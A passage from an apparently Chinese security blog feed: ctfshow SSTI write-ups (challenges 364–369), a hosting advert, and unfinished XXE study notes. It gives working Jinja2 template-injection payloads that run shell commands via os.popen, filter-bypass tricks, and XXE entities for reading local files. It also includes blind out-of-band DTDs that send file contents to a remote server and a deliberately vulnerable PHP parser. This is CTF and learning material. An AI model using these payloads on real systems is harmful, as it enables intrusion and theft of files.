id="4-ctfshow-364"><a href="#4-ctfshow-364" class="headerlink" title="4.ctfshow 364"></a>4.ctfshow 364</h3><p>这题<strong>过滤了args</strong>,这题可以用request.values来传参，相比之下values支持get和post，优先级的话是先get,使用方法基本一样</p><p>上payload</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">request.values.a</span>][<span class="hljs-symbol">request.values.b</span>](request.values.c).read()&#125;&#125;&amp;a=os&amp;b=popen&amp;c=cat /flag</span><br></code></pre></td></tr></table></figure><p>当然这题发现好像也可以传cookies来进行</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/364.png" alt="364"></p><p>当然了也可以用lipsum来，lipsum里面有内置的os模块</p><p>payload是</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;lipsum.<span class="hljs-strong">__globals__</span>.os.popen(request.values.aaa).read()&#125;&#125;&amp;aaa=cat /flag<br></code></pre></td></tr></table></figure><h3 id="5-ctfshow-365"><a href="#5-ctfshow-365" class="headerlink" title="5.ctfshow 365"></a>5.ctfshow 365</h3><p>这题用上面的lipsum的payload可以直接出答案</p><p>看了一下网上的wp这题是**过滤[]**，在上面的内容讲到过__getitem__，在遇到了‘和[]被禁用的时候可以使用这个函数</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;config.<span class="hljs-strong">__str__</span>().<span class="hljs-strong">__getitem__</span>(22)&#125;&#125;<br></code></pre></td></tr></table></figure><p>在这一题里面22是c，可以尝试构造cat &#x2F;flag，用~来拼接起来</p><h3 id="6-ctfshow-366"><a href="#6-ctfshow-366" class="headerlink" title="6.ctfshow 366"></a>6.ctfshow 366</h3><p>这题在前面题目的基础上<strong>过滤了下划线</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)()&#125;&#125;&amp;ocean=cat /flag&amp;a=<span class="hljs-strong">__globals__</span>&amp;b=<span class="hljs-strong">__getitem__</span>&amp;c=os&amp;d=popen&amp;f=read<br></code></pre></td></tr></table></figure><p>这里我自己有一个疑惑点，觉得getitem不是必要的，但是输入后又不正确，通过gpt询问后，给的大致原因是</p><p>第二个URL之所以能够执行，是因为它使用了 <code>__getitem__</code> 这种更灵活的方式来访问全局变量，从而成功获取到 <code>os</code> 模块，并最终执行了命令。而第一个URL中直接使用 <code>attr</code> 的方式可能会因为解析问题而失败。我的理解是并不能直接有效的访问到os这个模块</p><p>由于只是检测name里面的传参，其实也可以精简一点用cookie来传参</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/366.png" alt="366"></p><p>PS(我认为这里换values，进行post传参也是一种方法，但是方法不成立orz)</p><h3 id="7-ctfshow-367"><a href="#7-ctfshow-367" class="headerlink" title="7.ctfshow 367"></a>7.ctfshow 367</h3><p>这题<strong>过滤os</strong></p><p>直接用上面的payload直接可以过，看wp有一种是用get的方法</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=<span class="hljs-strong">__globals__</span>&amp;b=os&amp;c=cat /flag<br></code></pre></td></tr></table></figure><p>366的payload使用多个 <code>attr</code> 需要模板引擎逐步解析并执行每个步骤，在某些情况下可能出现解析和执行顺序问题，导致无法正确执行 <code>read</code>。</p><p>这一题的payload链式调用方式更简单，直接执行一系列方法调用，容易通过模板引擎解析并执行</p><p>至于我想的问题？上面的为什么后面不能直接调用read()</p><p>每一步 <code>attr</code> 调用之间是独立的，模板引擎会分别解析和执行每个 <code>attr</code>，这样导致在调用 <code>os.popen(&quot;cat /flag&quot;)</code> 后，结果没有直接传递给 <code>attr(request.values.f)()</code>。因此，模板引擎可能在 <code>attr</code> 调用之间无法正确链接上下文，导致 <code>read</code> 无法直接执行。</p><p>这是两者payload的区别，也是记录一下方便回顾。</p><h3 id="8-ctfshow-368"><a href="#8-ctfshow-368" class="headerlink" title="8.ctfshow 368"></a>8.ctfshow 368</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">测试了一下，这题禁用前双花括号,可以利用&#123;%...%&#125;，利用&#123;%print %&#125;打印出来<br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()%&#125;&amp;a=<span class="hljs-strong">__globals__</span>&amp;b=os&amp;c=cat /flag<br></code></pre></td></tr></table></figure><h3 id="9-ctfshow-369"><a href="#9-ctfshow-369" class="headerlink" title="9.ctfshow 369"></a>9.ctfshow 369</h3><p>这题<strong>禁用了request</strong>，就比较麻烦了</p><p>由于下划线被禁用了，不能使用getitem,看了师傅的wp,可以参照365部分的知识点，利用config里面string就行拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;f44b83e7-b564-400c-a10a-7dfd8acc96d3.challenge.ctf.show/?name=&#123;&#123;% print (config|string|list).pop(&#123;&#125;).lower() %&#125;&#125;&quot;</span><br>payload = <span class="hljs-string">&quot;cat /flag&quot;</span><br>result = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># 遍历 payload 中的每个字符</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> payload:<br>    <span class="hljs-comment"># 尝试从 0 到 999 的整数值</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">1000</span>):<br>        <span class="hljs-comment"># 向目标 URL 发送请求，替换占位符</span><br>        r = requests.get(url=url.<span class="hljs-built_in">format</span>(i))<br>        <span class="hljs-comment"># 查找响应中的 &lt;h3&gt; 标签位置</span><br>        location = r.text.find(<span class="hljs-string">&quot;&lt;h3&gt;&quot;</span>)<br>        <span class="hljs-comment"># 获取 &lt;h3&gt; 标签后的字符</span><br>        word = r.text[location+<span class="hljs-number">4</span>:location+<span class="hljs-number">5</span>]<br>        <span class="hljs-comment"># 如果字符匹配，记录并跳出循环</span><br>        <span class="hljs-keyword">if</span> word == j.lower():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;(config|string|list).pop(%d).lower() == %s&quot;</span> % (i, j))<br>            result += <span class="hljs-string">&quot;(config|string|list).pop(%d).lower()~&quot;</span> % (i)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># 打印最终结果，去掉末尾的 ~</span><br><span class="hljs-built_in">print</span>(result[:-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p>简要的payload就是</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;%print (lipsum|attr(a)).get(b).popen(c).read()%&#125;<br></code></pre></td></tr></table></figure><p>其中的abc，分别是<code>__globals__</code>,os,cat &#x2F;flag,带入构成payload</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/369.png" alt="369"></p><p>还有一种替换字符的没怎么看懂就不写了</p><p>后面的三题没怎么看懂wp，orz,大题就是利用dict构造得到数字，然后利用得到最后拼接的意思，这次就先写到这里了。</p><h2 id="五、刷题有感"><a href="#五、刷题有感" class="headerlink" title="五、刷题有感"></a>五、刷题有感</h2><p>这里放一下刷题遇到的姿势</p><h3 id="unicode绕过"><a href="#unicode绕过" class="headerlink" title="unicode绕过"></a>unicode绕过</h3><p>适用于禁用了一些常规的还把.给禁用的，配合attr|有奇效</p><p>例题:<a href="https://www.nssctf.cn/problem/910">安洵杯 2020Normal SSTI</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关注dk盾喵,谢谢喵</title>
    <link href="/2024/06/26/dk/%E5%8F%8B%E6%83%85%E6%8E%A8%E8%8D%90/"/>
    <url>/2024/06/26/dk/%E5%8F%8B%E6%83%85%E6%8E%A8%E8%8D%90/</url>
    
    <content type="html"><![CDATA[<p>在传统云服务器厂家还在为了薅光阿里云，腾讯云一众服务器而烦恼嘛</p><p>dk服务器值得拥有</p><p>扫码加群，了解详情，🎇</p><p>有符合各种需求的服务器，续费同价</p><p>🚀：DKdun-CTFers赞助计划火热进行</p><p>更多详情请加群了解(友链直达网站)</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/a.jpg" alt="a"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>xxe漏洞学习</title>
    <link href="/2024/06/10/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/06/10/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>前言:深入浅出的学习一下xxe漏洞</p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/3357?time__1311=n4+xnD0DgGYQwqYq40HpDUoL7rAT2rD&alichlgref=https://www.google.com/">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p><p><a href="https://blog.csdn.net/qq_61553520/article/details/130565993">XXE漏洞详解(全网最详细)</a></p><p><a href="https://blog.csdn.net/jayq1/article/details/139299924">【CTF-Web】XXE学习笔记</a></p><h2 id="一、XXE-是什么"><a href="#一、XXE-是什么" class="headerlink" title="一、XXE 是什么"></a><strong>一、XXE 是什么</strong></h2><p>在了解xxe之前，需要了解一下xml注入，通常都是逻辑漏洞，如下内容</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/xml.png" alt="xml"></p><p>能插入xml代码，肯定还想要更多骚操作，于是就出现了xxe</p><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，是一个注入漏洞。注意的是<strong>外部实体</strong>，不要被其他名字相似的东西扰乱了思维。</p><h2 id="二、基础知识"><a href="#二、基础知识" class="headerlink" title="二、基础知识"></a>二、基础知识</h2><h3 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h3><p>漏洞成因：解析时未对XML外部实体加以限制，导致攻击者将恶意代码注入到XML中，导致服务器加载恶意的外部实体引发文件读取，SSRF，命令执行等危害操作。</p><p>特征：HTTP的Request报文出现以下请求报文，说明采用的是xml数据传输，可以进行xml测试漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Content-<span class="hljs-built_in">type</span>:text/xml application/xml<br></code></pre></td></tr></table></figure><h3 id="XML的基础知识"><a href="#XML的基础知识" class="headerlink" title="XML的基础知识"></a>XML的基础知识</h3><h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">XML 指可扩展标记语言（EXtensible Markup Language）<br>XML 是一种标记语言，很类似 HTML<br>XML 被设计为传输和存储数据，其焦点是数据的内容<br>XML 被设计用来结构化、存储以及传输信息<br>XML 允许创作者定义自己的标签和自己的文档结构<br></code></pre></td></tr></table></figure><h4 id="结构"><a href="#结构" class="headerlink" title="结构:"></a>结构:</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1.XML 文档声明，在文档的第一行<br>2.XML 文档类型定义，即DTD，XXE 漏洞所在的地方<br>3.XML 文档元素<br></code></pre></td></tr></table></figure><h4 id="格式规范DTD"><a href="#格式规范DTD" class="headerlink" title="格式规范DTD:"></a>格式规范DTD:</h4><p>XML 文档有自己的格式规范，这个格式规范是 DTD（document type definition） 来控制的，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义<br>&lt;!DOCTYPE message [<br>&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;<br>&lt;!ELEMENT receiver (#PCDATA)&gt;<br>&lt;!ELEMENT sender (#PCDATA)&gt;<br>&lt;!ELEMENT header (#PCDATA)&gt;<br>&lt;!ELEMENT msg (#PCDATA)&gt;<br></code></pre></td></tr></table></figure><p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span>&gt;</span></span>Myself<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">sender</span>&gt;</span></span>Someone<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">sender</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span></span>TheReminder<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">msg</span>&gt;</span></span>This is an amazing book<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">msg</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>除了定义元素，还可以定义实体，分为内部实体和外部实体</p><h5 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;<br></code></pre></td></tr></table></figure><p>这里定义元素是ANY，说明接受任何元素，但是又定义了一个实体(也可以把他看成一个变量)，那么就可以写作这样</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们使用了&amp;xxe对上面定义的xxe实体进行了引用，到时候输出的时候&amp;xxe就会被test替代。</p><h5 id="外部实体-重点"><a href="#外部实体-重点" class="headerlink" title="外部实体(重点)"></a>外部实体(重点)</h5><p>有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，<br>外部实体的引用可以利用如下协议<br>file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.ext<br><a href="http://url/file.ext">http://url/file.ext</a><br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;conf.php</p><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;<br>&lt;creds&gt;<br>    &lt;user&gt;&amp;xxe;&lt;/user&gt;<br>    &lt;pass&gt;mypass&lt;/pass&gt;<br>&lt;/creds&gt;<br></code></pre></td></tr></table></figure><p>这样对引用资源所做的任何更改都会在文档中自动更新</p><p>还有一种引用方式是使用 引用公用 DTD的方法,如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;<br>%xxe;<br>]&gt;<br>&lt;foo&gt;&amp;evil;&lt;/foo&gt;<br> <br>外部evil.dtd中的内容<br>&lt;!ENTITY evil SYSTEM “file:///d:/1.txt” &gt;<br></code></pre></td></tr></table></figure><p>%xxe执行后会加载外部实体 evil.dtd 并执行，得到的结果会放在&lt;foo&gt;&lt;&#x2F;foo&gt;中。</p><hr><p>我们在上面将实体分为了内部和外部，但是实际情况上，也可以分为通用实体和参数实体（orz</p><h5 id="通用实体"><a href="#通用实体" class="headerlink" title="通用实体"></a>通用实体</h5><p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用，例如</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">updateProfile</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span></span><br><span class="hljs-meta"> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">updateProfile</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>Joe<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span>  <br>    ... <br><span class="hljs-tag">&lt;/<span class="hljs-name">updateProfile</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h5><p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">an-element</span> <span class="hljs-string">&quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;</span>&gt;</span> <br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote-dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://somewhere.example.org/remote.dtd&quot;</span>&gt;</span> <br>%an-element; %remote-dtd;<br></code></pre></td></tr></table></figure><p>参数实体在我们 Blind XXE 中起到了至关重要的作用</p><h2 id="三、XXE漏洞利用"><a href="#三、XXE漏洞利用" class="headerlink" title="三、XXE漏洞利用"></a>三、XXE漏洞利用</h2><p>通过对基础知识的理解，我们不难发现可以通过读dtd,将路径换成敏感路径，把敏感路径读取出来</p><h3 id="有回显读取本地文件"><a href="#有回显读取本地文件" class="headerlink" title="有回显读取本地文件"></a>有回显读取本地文件</h3><p>由于本人php版本高于7.1需要将代码进行适当的调整，如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 输出所有错误信息</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">// 临时允许外部实体加载（仅用于测试）</span><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">// 获取XML字符串</span><br><span class="hljs-variable">$xmlString</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xml&#x27;</span>];<br><br><span class="hljs-comment">// 解析XML字符串</span><br><span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">simplexml_load_string</span>(<span class="hljs-variable">$xmlString</span>, <span class="hljs-literal">null</span>, LIBXML_NOENT);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$xml</span> === <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Failed to load XML. Errors: &quot;</span>;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">libxml_get_errors</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$error</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>, <span class="hljs-variable">$error</span>-&gt;message;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Parsed XML: &quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$xml</span>); <span class="hljs-comment">// 使用htmlspecialchars防止XSS</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>payload进行url编码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///D://1.txt&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/%E6%9C%AC%E5%9C%B0%E5%9B%9E%E6%98%BE.png" alt="本地回显"></p><p>由此还可以继续延申，在这种情况下由于没有什么特殊符号，可以顺利读取，那假如有呢</p><p>比如<img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/1.txt.png" alt="1.txt"></p><p>我们再继续尝试看看网页，此时会有一堆报错</p><p>这个时候可以使用<strong>CDATA</strong></p><p>介绍：CDATA节中所有的字符都会被当做元素字符数据的常量部分，而不是xml标记</p><p>因此可以尝试把读出来的数据放在CDATA中输出进行绕过,这里会用到参数实体，payload就不展示了，感兴趣可以自己尝试。</p><h3 id="无回显读取本地文件"><a href="#无回显读取本地文件" class="headerlink" title="无回显读取本地文件"></a>无回显读取本地文件</h3><h4 id="加载远程DTD"><a href="#加载远程DTD" class="headerlink" title="加载远程DTD"></a>加载远程DTD</h4><p>在远程服务器上新建test.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx.xxx.xxx.xxx/?content=%file;&#x27;&gt;&quot;&gt; %payload;<br>//%号要进行实体编码成&amp;#x25<br></code></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE test[<br>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/1.txt&quot;&gt;<br>&lt;!ENTITY % dtd SYSTEM &quot;http://xxx.xxx.xxx.xxx/test.dtd&quot;&gt;<br>%dtd;<br>%send;<br>]&gt;<br></code></pre></td></tr></table></figure><p>讲一下流程：首先先执行%dtd请求远程服务器上的test.dtd,然后执行%payload发送执行%file，最后执行%file获取对方服务器上的敏感文件，替换%send，实现外带</p><p>套用模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; <br>&lt;!DOCTYPE data [<br>&lt;!ENTITY % file SYSTEM &quot;file:///c://test/1.txt&quot;&gt;<br>&lt;!ENTITY % dtd SYSTEM &quot;http://localhost:88/evil.xml&quot;&gt; <br>%dtd; %all; <br>]&gt; <br>&lt;value&gt;&amp;send;&lt;/value&gt;<br> <br>evil.xml文件内容为<br>&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost:88%file;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE root [<br>&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;&gt;<br>&lt;!ENTITY % dtd SYSTEM &quot;http://localhost:88/evil.xml&quot;&gt;<br>%dtd;<br>%send;<br>]&gt;<br>&lt;root&gt;&lt;/root&gt;<br> <br>evil.xml文件内容为：<br>&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 